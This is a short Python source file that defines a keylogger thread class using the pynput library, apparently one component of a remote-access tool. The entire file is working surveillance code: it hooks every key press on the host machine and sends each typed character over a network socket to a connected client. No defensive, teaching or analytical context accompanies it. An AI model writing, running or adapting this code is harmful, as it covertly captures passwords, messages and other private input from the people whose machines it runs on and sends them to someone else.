from pynput import keyboard
import threading

class Keylogger(threading.Thread):
    def __init__(self, client_socket):
        super().__init__()
        self.client_socket = client_socket
        self._stop_event = threading.Event()
        self.listener = None

    def run(self):
        self.listener = keyboard.Listener(on_press=self.log)
        self.listener.start()
        print("Server: keylogger started")

        while not self._stop_event.is_set():
            # Check if the client is still connected
            if not self.client_socket.fileno() == -1:
                continue

            # Stop the listener when the client disconnects
            self.listener.stop()
            break

        print("Server: keylogger stopped")

    def stop(self):
        self._stop_event.set()
        if self.listener:
            self.listener.stop()
            self.listener.join()  # Wait for the listener to finish

    def log(self, key):
        try:
            # Send the character over the socket to the client
            if hasattr(key, "char"):
                self.client_socket.send(str(key.char).encode())
        except Exception as e:
            print(f"Error while logging: {e}")
